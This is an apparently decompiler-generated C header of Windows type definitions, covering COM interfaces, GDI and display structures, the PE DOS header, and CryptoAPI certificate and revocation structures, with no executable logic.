typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct IShellFolder IShellFolder, *PIShellFolder;

typedef struct IShellFolderVtbl IShellFolderVtbl, *PIShellFolderVtbl;

typedef long HRESULT;


// WARNING! conflicting data type names: /guiddef.h/GUID - /GUID

typedef GUID IID;

typedef ulong DWORD;

typedef DWORD ULONG;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef struct IBindCtx IBindCtx, *PIBindCtx;

typedef wchar_t WCHAR;

typedef WCHAR *LPWSTR;

typedef struct _ITEMIDLIST _ITEMIDLIST, *P_ITEMIDLIST;

typedef struct _ITEMIDLIST ITEMIDLIST;

typedef ITEMIDLIST *LPITEMIDLIST;

typedef DWORD SHCONTF;

typedef struct IEnumIDList IEnumIDList, *PIEnumIDList;

typedef ITEMIDLIST *LPCITEMIDLIST;

typedef long LONG_PTR;

typedef LONG_PTR LPARAM;

typedef uint UINT;

typedef ULONG SFGAOF;

typedef DWORD SHGDNF;

typedef struct _STRRET _STRRET, *P_STRRET;

typedef struct _STRRET STRRET;

typedef WCHAR *LPCWSTR;

typedef struct IBindCtxVtbl IBindCtxVtbl, *PIBindCtxVtbl;

typedef struct IUnknown IUnknown, *PIUnknown;

typedef struct tagBIND_OPTS tagBIND_OPTS, *PtagBIND_OPTS;

typedef struct tagBIND_OPTS BIND_OPTS;

typedef struct IRunningObjectTable IRunningObjectTable, *PIRunningObjectTable;

typedef WCHAR OLECHAR;

typedef OLECHAR *LPOLESTR;

typedef struct IEnumString IEnumString, *PIEnumString;

typedef struct _SHITEMID _SHITEMID, *P_SHITEMID;

typedef struct _SHITEMID SHITEMID;

typedef struct IEnumIDListVtbl IEnumIDListVtbl, *PIEnumIDListVtbl;

typedef union _union_3888 _union_3888, *P_union_3888;

typedef struct IUnknownVtbl IUnknownVtbl, *PIUnknownVtbl;

typedef struct IRunningObjectTableVtbl IRunningObjectTableVtbl, *PIRunningObjectTableVtbl;

typedef struct IMoniker IMoniker, *PIMoniker;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

typedef struct IEnumMoniker IEnumMoniker, *PIEnumMoniker;

typedef struct IEnumStringVtbl IEnumStringVtbl, *PIEnumStringVtbl;

typedef ushort USHORT;

typedef uchar BYTE;

typedef struct IMonikerVtbl IMonikerVtbl, *PIMonikerVtbl;

typedef GUID CLSID;

typedef struct IStream IStream, *PIStream;

typedef int BOOL;

typedef union _ULARGE_INTEGER _ULARGE_INTEGER, *P_ULARGE_INTEGER;

typedef union _ULARGE_INTEGER ULARGE_INTEGER;

typedef struct IEnumMonikerVtbl IEnumMonikerVtbl, *PIEnumMonikerVtbl;

typedef struct IStreamVtbl IStreamVtbl, *PIStreamVtbl;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct tagSTATSTG tagSTATSTG, *PtagSTATSTG;

typedef struct tagSTATSTG STATSTG;

typedef struct _struct_22 _struct_22, *P_struct_22;

typedef struct _struct_23 _struct_23, *P_struct_23;

typedef double ULONGLONG;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

typedef long LONG;

struct IStreamVtbl {
    HRESULT (*QueryInterface)(struct IStream *, IID *, void **);
    ULONG (*AddRef)(struct IStream *);
    ULONG (*Release)(struct IStream *);
    HRESULT (*Read)(struct IStream *, void *, ULONG, ULONG *);
    HRESULT (*Write)(struct IStream *, void *, ULONG, ULONG *);
    HRESULT (*Seek)(struct IStream *, LARGE_INTEGER, DWORD, ULARGE_INTEGER *);
    HRESULT (*SetSize)(struct IStream *, ULARGE_INTEGER);
    HRESULT (*CopyTo)(struct IStream *, struct IStream *, ULARGE_INTEGER, ULARGE_INTEGER *, ULARGE_INTEGER *);
    HRESULT (*Commit)(struct IStream *, DWORD);
    HRESULT (*Revert)(struct IStream *);
    HRESULT (*LockRegion)(struct IStream *, ULARGE_INTEGER, ULARGE_INTEGER, DWORD);
    HRESULT (*UnlockRegion)(struct IStream *, ULARGE_INTEGER, ULARGE_INTEGER, DWORD);
    HRESULT (*Stat)(struct IStream *, STATSTG *, DWORD);
    HRESULT (*Clone)(struct IStream *, struct IStream **);
};

struct _SHITEMID {
    USHORT cb;
    BYTE abID[1];
};

struct _ITEMIDLIST {
    SHITEMID mkid;
};

struct IEnumStringVtbl {
    HRESULT (*QueryInterface)(struct IEnumString *, IID *, void **);
    ULONG (*AddRef)(struct IEnumString *);
    ULONG (*Release)(struct IEnumString *);
    HRESULT (*Next)(struct IEnumString *, ULONG, LPOLESTR *, ULONG *);
    HRESULT (*Skip)(struct IEnumString *, ULONG);
    HRESULT (*Reset)(struct IEnumString *);
    HRESULT (*Clone)(struct IEnumString *, struct IEnumString **);
};

struct IStream {
    struct IStreamVtbl *lpVtbl;
};

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

struct IEnumIDList {
    struct IEnumIDListVtbl *lpVtbl;
};

struct IMoniker {
    struct IMonikerVtbl *lpVtbl;
};

struct IEnumString {
    struct IEnumStringVtbl *lpVtbl;
};

struct IEnumIDListVtbl {
    HRESULT (*QueryInterface)(struct IEnumIDList *, IID *, void **);
    ULONG (*AddRef)(struct IEnumIDList *);
    ULONG (*Release)(struct IEnumIDList *);
    HRESULT (*Next)(struct IEnumIDList *, ULONG, LPITEMIDLIST *, ULONG *);
    HRESULT (*Skip)(struct IEnumIDList *, ULONG);
    HRESULT (*Reset)(struct IEnumIDList *);
    HRESULT (*Clone)(struct IEnumIDList *, struct IEnumIDList **);
};

struct IEnumMonikerVtbl {
    HRESULT (*QueryInterface)(struct IEnumMoniker *, IID *, void **);
    ULONG (*AddRef)(struct IEnumMoniker *);
    ULONG (*Release)(struct IEnumMoniker *);
    HRESULT (*Next)(struct IEnumMoniker *, ULONG, struct IMoniker **, ULONG *);
    HRESULT (*Skip)(struct IEnumMoniker *, ULONG);
    HRESULT (*Reset)(struct IEnumMoniker *);
    HRESULT (*Clone)(struct IEnumMoniker *, struct IEnumMoniker **);
};

struct tagBIND_OPTS {
    DWORD cbStruct;
    DWORD grfFlags;
    DWORD grfMode;
    DWORD dwTickCountDeadline;
};

struct _struct_22 {
    DWORD LowPart;
    DWORD HighPart;
};

struct _struct_23 {
    DWORD LowPart;
    DWORD HighPart;
};

union _ULARGE_INTEGER {
    struct _struct_22 s;
    struct _struct_23 u;
    ULONGLONG QuadPart;
};

struct IBindCtx {
    struct IBindCtxVtbl *lpVtbl;
};

struct IBindCtxVtbl {
    HRESULT (*QueryInterface)(struct IBindCtx *, IID *, void **);
    ULONG (*AddRef)(struct IBindCtx *);
    ULONG (*Release)(struct IBindCtx *);
    HRESULT (*RegisterObjectBound)(struct IBindCtx *, struct IUnknown *);
    HRESULT (*RevokeObjectBound)(struct IBindCtx *, struct IUnknown *);
    HRESULT (*ReleaseBoundObjects)(struct IBindCtx *);
    HRESULT (*SetBindOptions)(struct IBindCtx *, BIND_OPTS *);
    HRESULT (*GetBindOptions)(struct IBindCtx *, BIND_OPTS *);
    HRESULT (*GetRunningObjectTable)(struct IBindCtx *, struct IRunningObjectTable **);
    HRESULT (*RegisterObjectParam)(struct IBindCtx *, LPOLESTR, struct IUnknown *);
    HRESULT (*GetObjectParam)(struct IBindCtx *, LPOLESTR, struct IUnknown **);
    HRESULT (*EnumObjectParam)(struct IBindCtx *, struct IEnumString **);
    HRESULT (*RevokeObjectParam)(struct IBindCtx *, LPOLESTR);
};

struct IRunningObjectTableVtbl {
    HRESULT (*QueryInterface)(struct IRunningObjectTable *, IID *, void **);
    ULONG (*AddRef)(struct IRunningObjectTable *);
    ULONG (*Release)(struct IRunningObjectTable *);
    HRESULT (*Register)(struct IRunningObjectTable *, DWORD, struct IUnknown *, struct IMoniker *, DWORD *);
    HRESULT (*Revoke)(struct IRunningObjectTable *, DWORD);
    HRESULT (*IsRunning)(struct IRunningObjectTable *, struct IMoniker *);
    HRESULT (*GetObjectA)(struct IRunningObjectTable *, struct IMoniker *, struct IUnknown **);
    HRESULT (*NoteChangeTime)(struct IRunningObjectTable *, DWORD, FILETIME *);
    HRESULT (*GetTimeOfLastChange)(struct IRunningObjectTable *, struct IMoniker *, FILETIME *);
    HRESULT (*EnumRunning)(struct IRunningObjectTable *, struct IEnumMoniker **);
};

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

struct tagSTATSTG {
    LPOLESTR pwcsName;
    DWORD type;
    ULARGE_INTEGER cbSize;
    FILETIME mtime;
    FILETIME ctime;
    FILETIME atime;
    DWORD grfMode;
    DWORD grfLocksSupported;
    CLSID clsid;
    DWORD grfStateBits;
    DWORD reserved;
};

struct IMonikerVtbl {
    HRESULT (*QueryInterface)(struct IMoniker *, IID *, void **);
    ULONG (*AddRef)(struct IMoniker *);
    ULONG (*Release)(struct IMoniker *);
    HRESULT (*GetClassID)(struct IMoniker *, CLSID *);
    HRESULT (*IsDirty)(struct IMoniker *);
    HRESULT (*Load)(struct IMoniker *, struct IStream *);
    HRESULT (*Save)(struct IMoniker *, struct IStream *, BOOL);
    HRESULT (*GetSizeMax)(struct IMoniker *, ULARGE_INTEGER *);
    HRESULT (*BindToObject)(struct IMoniker *, struct IBindCtx *, struct IMoniker *, IID *, void **);
    HRESULT (*BindToStorage)(struct IMoniker *, struct IBindCtx *, struct IMoniker *, IID *, void **);
    HRESULT (*Reduce)(struct IMoniker *, struct IBindCtx *, DWORD, struct IMoniker **, struct IMoniker **);
    HRESULT (*ComposeWith)(struct IMoniker *, struct IMoniker *, BOOL, struct IMoniker **);
    HRESULT (*Enum)(struct IMoniker *, BOOL, struct IEnumMoniker **);
    HRESULT (*IsEqual)(struct IMoniker *, struct IMoniker *);
    HRESULT (*Hash)(struct IMoniker *, DWORD *);
    HRESULT (*IsRunning)(struct IMoniker *, struct IBindCtx *, struct IMoniker *, struct IMoniker *);
    HRESULT (*GetTimeOfLastChange)(struct IMoniker *, struct IBindCtx *, struct IMoniker *, FILETIME *);
    HRESULT (*Inverse)(struct IMoniker *, struct IMoniker **);
    HRESULT (*CommonPrefixWith)(struct IMoniker *, struct IMoniker *, struct IMoniker **);
    HRESULT (*RelativePathTo)(struct IMoniker *, struct IMoniker *, struct IMoniker **);
    HRESULT (*GetDisplayName)(struct IMoniker *, struct IBindCtx *, struct IMoniker *, LPOLESTR *);
    HRESULT (*ParseDisplayName)(struct IMoniker *, struct IBindCtx *, struct IMoniker *, LPOLESTR, ULONG *, struct IMoniker **);
    HRESULT (*IsSystemMoniker)(struct IMoniker *, DWORD *);
};

struct HWND__ {
    int unused;
};

struct IShellFolder {
    struct IShellFolderVtbl *lpVtbl;
};

struct IShellFolderVtbl {
    HRESULT (*QueryInterface)(struct IShellFolder *, IID *, void **);
    ULONG (*AddRef)(struct IShellFolder *);
    ULONG (*Release)(struct IShellFolder *);
    HRESULT (*ParseDisplayName)(struct IShellFolder *, HWND, struct IBindCtx *, LPWSTR, ULONG *, LPITEMIDLIST *, ULONG *);
    HRESULT (*EnumObjects)(struct IShellFolder *, HWND, SHCONTF, struct IEnumIDList **);
    HRESULT (*BindToObject)(struct IShellFolder *, LPCITEMIDLIST, struct IBindCtx *, IID *, void **);
    HRESULT (*BindToStorage)(struct IShellFolder *, LPCITEMIDLIST, struct IBindCtx *, IID *, void **);
    HRESULT (*CompareIDs)(struct IShellFolder *, LPARAM, LPCITEMIDLIST, LPCITEMIDLIST);
    HRESULT (*CreateViewObject)(struct IShellFolder *, HWND, IID *, void **);
    HRESULT (*GetAttributesOf)(struct IShellFolder *, UINT, LPCITEMIDLIST *, SFGAOF *);
    HRESULT (*GetUIObjectOf)(struct IShellFolder *, HWND, UINT, LPCITEMIDLIST *, IID *, UINT *, void **);
    HRESULT (*GetDisplayNameOf)(struct IShellFolder *, LPCITEMIDLIST, SHGDNF, STRRET *);
    HRESULT (*SetNameOf)(struct IShellFolder *, HWND, LPCITEMIDLIST, LPCWSTR, SHGDNF, LPITEMIDLIST *);
};

struct IRunningObjectTable {
    struct IRunningObjectTableVtbl *lpVtbl;
};

struct IUnknownVtbl {
    HRESULT (*QueryInterface)(struct IUnknown *, IID *, void **);
    ULONG (*AddRef)(struct IUnknown *);
    ULONG (*Release)(struct IUnknown *);
};

struct IUnknown {
    struct IUnknownVtbl *lpVtbl;
};

union _union_3888 {
    LPWSTR pOleStr;
    UINT uOffset;
    char cStr[260];
};

struct _STRRET {
    UINT uType;
    union _union_3888 u;
};

struct IEnumMoniker {
    struct IEnumMonikerVtbl *lpVtbl;
};

typedef struct _ICONINFO _ICONINFO, *P_ICONINFO;

typedef struct _ICONINFO ICONINFO;

typedef ICONINFO *PICONINFO;

typedef struct HBITMAP__ HBITMAP__, *PHBITMAP__;

typedef struct HBITMAP__ *HBITMAP;

struct _ICONINFO {
    BOOL fIcon;
    DWORD xHotspot;
    DWORD yHotspot;
    HBITMAP hbmMask;
    HBITMAP hbmColor;
};

struct HBITMAP__ {
    int unused;
};

typedef struct tagMSGBOXPARAMSW tagMSGBOXPARAMSW, *PtagMSGBOXPARAMSW;

typedef struct tagMSGBOXPARAMSW MSGBOXPARAMSW;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

typedef ulong ULONG_PTR;

typedef ULONG_PTR DWORD_PTR;

typedef struct tagHELPINFO tagHELPINFO, *PtagHELPINFO;

typedef struct tagHELPINFO *LPHELPINFO;

typedef void (*MSGBOXCALLBACK)(LPHELPINFO);

typedef void *HANDLE;

typedef struct tagPOINT tagPOINT, *PtagPOINT;

typedef struct tagPOINT POINT;

struct tagPOINT {
    LONG x;
    LONG y;
};

struct tagHELPINFO {
    UINT cbSize;
    int iContextType;
    int iCtrlId;
    HANDLE hItemHandle;
    DWORD_PTR dwContextId;
    POINT MousePos;
};

struct tagMSGBOXPARAMSW {
    UINT cbSize;
    HWND hwndOwner;
    HINSTANCE hInstance;
    LPCWSTR lpszText;
    LPCWSTR lpszCaption;
    DWORD dwStyle;
    LPCWSTR lpszIcon;
    DWORD_PTR dwContextHelpId;
    MSGBOXCALLBACK lpfnMsgBoxCallback;
    DWORD dwLanguageId;
};

struct HINSTANCE__ {
    int unused;
};

typedef BOOL (*WNDENUMPROC)(HWND, LPARAM);

typedef int INT_PTR;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef INT_PTR (*DLGPROC)(HWND, UINT, WPARAM, LPARAM);

typedef struct tagMENUINFO tagMENUINFO, *PtagMENUINFO;

typedef struct tagMENUINFO *LPMENUINFO;

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

typedef struct HBRUSH__ *HBRUSH;

struct HBRUSH__ {
    int unused;
};

struct tagMENUINFO {
    DWORD cbSize;
    DWORD fMask;
    DWORD dwStyle;
    UINT cyMax;
    HBRUSH hbrBack;
    DWORD dwContextHelpID;
    ULONG_PTR dwMenuData;
};

typedef BOOL (*NAMEENUMPROCW)(LPWSTR, LPARAM);

typedef NAMEENUMPROCW DESKTOPENUMPROCW;

typedef struct _GUID _GUID, *P_GUID;

struct _GUID {
    ulong Data1;
    ushort Data2;
    ushort Data3;
    uchar Data4[8];
};

typedef struct tagWCRANGE tagWCRANGE, *PtagWCRANGE;

typedef struct tagWCRANGE WCRANGE;

struct tagWCRANGE {
    WCHAR wcLow;
    USHORT cGlyphs;
};

typedef struct tagGLYPHSET tagGLYPHSET, *PtagGLYPHSET;

struct tagGLYPHSET {
    DWORD cbThis;
    DWORD flAccel;
    DWORD cGlyphsSupported;
    DWORD cRanges;
    WCRANGE ranges[1];
};

typedef struct _BLENDFUNCTION _BLENDFUNCTION, *P_BLENDFUNCTION;

typedef struct _BLENDFUNCTION BLENDFUNCTION;

struct _BLENDFUNCTION {
    BYTE BlendOp;
    BYTE BlendFlags;
    BYTE SourceConstantAlpha;
    BYTE AlphaFormat;
};

typedef struct _devicemodeA _devicemodeA, *P_devicemodeA;

typedef struct _devicemodeA DEVMODEA;

typedef ushort WORD;

typedef union _union_655 _union_655, *P_union_655;

typedef union _union_658 _union_658, *P_union_658;

typedef struct _struct_656 _struct_656, *P_struct_656;

typedef struct _struct_657 _struct_657, *P_struct_657;

typedef struct _POINTL _POINTL, *P_POINTL;

typedef struct _POINTL POINTL;

struct _struct_656 {
    short dmOrientation;
    short dmPaperSize;
    short dmPaperLength;
    short dmPaperWidth;
    short dmScale;
    short dmCopies;
    short dmDefaultSource;
    short dmPrintQuality;
};

struct _POINTL {
    LONG x;
    LONG y;
};

struct _struct_657 {
    POINTL dmPosition;
    DWORD dmDisplayOrientation;
    DWORD dmDisplayFixedOutput;
};

union _union_655 {
    struct _struct_656 field0;
    struct _struct_657 field1;
};

union _union_658 {
    DWORD dmDisplayFlags;
    DWORD dmNup;
};

struct _devicemodeA {
    BYTE dmDeviceName[32];
    WORD dmSpecVersion;
    WORD dmDriverVersion;
    WORD dmSize;
    WORD dmDriverExtra;
    DWORD dmFields;
    union _union_655 field6_0x2c;
    short dmColor;
    short dmDuplex;
    short dmYResolution;
    short dmTTOption;
    short dmCollate;
    BYTE dmFormName[32];
    WORD dmLogPixels;
    DWORD dmBitsPerPel;
    DWORD dmPelsWidth;
    DWORD dmPelsHeight;
    union _union_658 field17_0x74;
    DWORD dmDisplayFrequency;
    DWORD dmICMMethod;
    DWORD dmICMIntent;
    DWORD dmMediaType;
    DWORD dmDitherType;
    DWORD dmReserved1;
    DWORD dmReserved2;
    DWORD dmPanningWidth;
    DWORD dmPanningHeight;
};

typedef struct tagMETAFILEPICT tagMETAFILEPICT, *PtagMETAFILEPICT;

typedef struct tagMETAFILEPICT METAFILEPICT;

typedef struct HMETAFILE__ HMETAFILE__, *PHMETAFILE__;

typedef struct HMETAFILE__ *HMETAFILE;

struct tagMETAFILEPICT {
    LONG mm;
    LONG xExt;
    LONG yExt;
    HMETAFILE hMF;
};

struct HMETAFILE__ {
    int unused;
};

typedef struct tagCOLORADJUSTMENT tagCOLORADJUSTMENT, *PtagCOLORADJUSTMENT;

typedef short SHORT;

struct tagCOLORADJUSTMENT {
    WORD caSize;
    WORD caFlags;
    WORD caIlluminantIndex;
    WORD caRedGamma;
    WORD caGreenGamma;
    WORD caBlueGamma;
    WORD caReferenceBlack;
    WORD caReferenceWhite;
    SHORT caContrast;
    SHORT caBrightness;
    SHORT caColorfulness;
    SHORT caRedGreenTint;
};

typedef struct tagCOLORADJUSTMENT *LPCOLORADJUSTMENT;

typedef struct tagGLYPHSET *LPGLYPHSET;

typedef DWORD CALID;

typedef DWORD CALTYPE;

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _SYSTEMTIME SYSTEMTIME;

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef CHAR *LPCSTR;

typedef DWORD ACCESS_MASK;

typedef DWORD LCID;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef struct _CRYPTOAPI_BLOB _CRYPTOAPI_BLOB, *P_CRYPTOAPI_BLOB;

typedef struct _CRYPTOAPI_BLOB CRYPT_OBJID_BLOB;

struct _CRYPTOAPI_BLOB {
    DWORD cbData;
    BYTE *pbData;
};

typedef struct _CRYPTOAPI_BLOB CRYPT_INTEGER_BLOB;

typedef struct _CTL_CONTEXT _CTL_CONTEXT, *P_CTL_CONTEXT;

typedef struct _CTL_CONTEXT CTL_CONTEXT;

typedef struct _CTL_INFO _CTL_INFO, *P_CTL_INFO;

typedef struct _CTL_INFO *PCTL_INFO;

typedef void *HCERTSTORE;

typedef void *HCRYPTMSG;

typedef struct _CTL_USAGE _CTL_USAGE, *P_CTL_USAGE;

typedef struct _CTL_USAGE CTL_USAGE;

typedef struct _CRYPTOAPI_BLOB CRYPT_DATA_BLOB;

typedef struct _CRYPT_ALGORITHM_IDENTIFIER _CRYPT_ALGORITHM_IDENTIFIER, *P_CRYPT_ALGORITHM_IDENTIFIER;

typedef struct _CRYPT_ALGORITHM_IDENTIFIER CRYPT_ALGORITHM_IDENTIFIER;

typedef struct _CTL_ENTRY _CTL_ENTRY, *P_CTL_ENTRY;

typedef struct _CTL_ENTRY *PCTL_ENTRY;

typedef struct _CERT_EXTENSION _CERT_EXTENSION, *P_CERT_EXTENSION;

typedef struct _CERT_EXTENSION *PCERT_EXTENSION;

typedef struct _CRYPT_ATTRIBUTE _CRYPT_ATTRIBUTE, *P_CRYPT_ATTRIBUTE;

typedef struct _CRYPT_ATTRIBUTE *PCRYPT_ATTRIBUTE;

typedef struct _CRYPTOAPI_BLOB *PCRYPT_ATTR_BLOB;

struct _CTL_CONTEXT {
    DWORD dwMsgAndCertEncodingType;
    BYTE *pbCtlEncoded;
    DWORD cbCtlEncoded;
    PCTL_INFO pCtlInfo;
    HCERTSTORE hCertStore;
    HCRYPTMSG hCryptMsg;
    BYTE *pbCtlContent;
    DWORD cbCtlContent;
};

struct _CRYPT_ATTRIBUTE {
    LPSTR pszObjId;
    DWORD cValue;
    PCRYPT_ATTR_BLOB rgValue;
};

struct _CRYPT_ALGORITHM_IDENTIFIER {
    LPSTR pszObjId;
    CRYPT_OBJID_BLOB Parameters;
};

struct _CTL_USAGE {
    DWORD cUsageIdentifier;
    LPSTR *rgpszUsageIdentifier;
};

struct _CERT_EXTENSION {
    LPSTR pszObjId;
    BOOL fCritical;
    CRYPT_OBJID_BLOB Value;
};

struct _CTL_ENTRY {
    CRYPT_DATA_BLOB SubjectIdentifier;
    DWORD cAttribute;
    PCRYPT_ATTRIBUTE rgAttribute;
};

struct _CTL_INFO {
    DWORD dwVersion;
    CTL_USAGE SubjectUsage;
    CRYPT_DATA_BLOB ListIdentifier;
    CRYPT_INTEGER_BLOB SequenceNumber;
    FILETIME ThisUpdate;
    FILETIME NextUpdate;
    CRYPT_ALGORITHM_IDENTIFIER SubjectAlgorithm;
    DWORD cCTLEntry;
    PCTL_ENTRY rgCTLEntry;
    DWORD cExtension;
    PCERT_EXTENSION rgExtension;
};

typedef struct _CRL_ENTRY _CRL_ENTRY, *P_CRL_ENTRY;

struct _CRL_ENTRY {
    CRYPT_INTEGER_BLOB SerialNumber;
    FILETIME RevocationDate;
    DWORD cExtension;
    PCERT_EXTENSION rgExtension;
};

typedef struct _CERT_REVOCATION_CRL_INFO _CERT_REVOCATION_CRL_INFO, *P_CERT_REVOCATION_CRL_INFO;

typedef struct _CRL_CONTEXT _CRL_CONTEXT, *P_CRL_CONTEXT;

typedef struct _CRL_CONTEXT CRL_CONTEXT;

typedef CRL_CONTEXT *PCCRL_CONTEXT;

typedef struct _CRL_ENTRY *PCRL_ENTRY;

typedef struct _CRL_INFO _CRL_INFO, *P_CRL_INFO;

typedef struct _CRL_INFO *PCRL_INFO;

typedef struct _CRYPTOAPI_BLOB CERT_NAME_BLOB;

struct _CERT_REVOCATION_CRL_INFO {
    DWORD cbSize;
    PCCRL_CONTEXT pBaseCrlContext;
    PCCRL_CONTEXT pDeltaCrlContext;
    PCRL_ENTRY pCrlEntry;
    BOOL fDeltaCrlEntry;
};

struct _CRL_INFO {
    DWORD dwVersion;
    CRYPT_ALGORITHM_IDENTIFIER SignatureAlgorithm;
    CERT_NAME_BLOB Issuer;
    FILETIME ThisUpdate;
    FILETIME NextUpdate;
    DWORD cCRLEntry;
    PCRL_ENTRY rgCRLEntry;
    DWORD cExtension;
    PCERT_EXTENSION rgExtension;
};

struct _CRL_CONTEXT {
    DWORD dwCertEncodingType;
    BYTE *pbCrlEncoded;
    DWORD cbCrlEncoded;
    PCRL_INFO pCrlInfo;
    HCERTSTORE hCertStore;
};

typedef struct _CERT_CHAIN_ELEMENT _CERT_CHAIN_ELEMENT, *P_CERT_CHAIN_ELEMENT;

typedef struct _CERT_CONTEXT _CERT_CONTEXT, *P_CERT_CONTEXT;

typedef struct _CERT_CONTEXT CERT_CONTEXT;

typedef CERT_CONTEXT *PCCERT_CONTEXT;

typedef struct _CERT_TRUST_STATUS _CERT_TRUST_STATUS, *P_CERT_TRUST_STATUS;

typedef struct _CERT_TRUST_STATUS CERT_TRUST_STATUS;

typedef struct _CERT_REVOCATION_INFO _CERT_REVOCATION_INFO, *P_CERT_REVOCATION_INFO;

typedef struct _CERT_REVOCATION_INFO *PCERT_REVOCATION_INFO;

typedef struct _CTL_USAGE *PCERT_ENHKEY_USAGE;

typedef struct _CERT_INFO _CERT_INFO, *P_CERT_INFO;

typedef struct _CERT_INFO *PCERT_INFO;

typedef struct _CERT_REVOCATION_CRL_INFO *PCERT_REVOCATION_CRL_INFO;

typedef struct _CERT_PUBLIC_KEY_INFO _CERT_PUBLIC_KEY_INFO, *P_CERT_PUBLIC_KEY_INFO;

typedef struct _CERT_PUBLIC_KEY_INFO CERT_PUBLIC_KEY_INFO;

typedef struct _CRYPT_BIT_BLOB _CRYPT_BIT_BLOB, *P_CRYPT_BIT_BLOB;

typedef struct _CRYPT_BIT_BLOB CRYPT_BIT_BLOB;

struct _CERT_REVOCATION_INFO {
    DWORD cbSize;
    DWORD dwRevocationResult;
    LPCSTR pszRevocationOid;
    LPVOID pvOidSpecificInfo;
    BOOL fHasFreshnessTime;
    DWORD dwFreshnessTime;
    PCERT_REVOCATION_CRL_INFO pCrlInfo;
};

struct _CERT_TRUST_STATUS {
    DWORD dwErrorStatus;
    DWORD dwInfoStatus;
};

struct _CERT_CHAIN_ELEMENT {
    DWORD cbSize;
    PCCERT_CONTEXT pCertContext;
    CERT_TRUST_STATUS TrustStatus;
    PCERT_REVOCATION_INFO pRevocationInfo;
    PCERT_ENHKEY_USAGE pIssuanceUsage;
    PCERT_ENHKEY_USAGE pApplicationUsage;
    LPCWSTR pwszExtendedErrorInfo;
};

struct _CRYPT_BIT_BLOB {
    DWORD cbData;
    BYTE *pbData;
    DWORD cUnusedBits;
};

struct _CERT_CONTEXT {
    DWORD dwCertEncodingType;
    BYTE *pbCertEncoded;
    DWORD cbCertEncoded;
    PCERT_INFO pCertInfo;
    HCERTSTORE hCertStore;
};

struct _CERT_PUBLIC_KEY_INFO {
    CRYPT_ALGORITHM_IDENTIFIER Algorithm;
    CRYPT_BIT_BLOB PublicKey;
};

struct _CERT_INFO {
    DWORD dwVersion;
    CRYPT_INTEGER_BLOB SerialNumber;
    CRYPT_ALGORITHM_IDENTIFIER SignatureAlgorithm;
    CERT_NAME_BLOB Issuer;
    FILETIME NotBefore;
    FILETIME NotAfter;
    CERT_NAME_BLOB Subject;
    CERT_PUBLIC_KEY_INFO SubjectPublicKeyInfo;
    CRYPT_BIT_BLOB IssuerUniqueId;
    CRYPT_BIT_BLOB SubjectUniqueId;
    DWORD cExtension;
    PCERT_EXTENSION rgExtension;
};

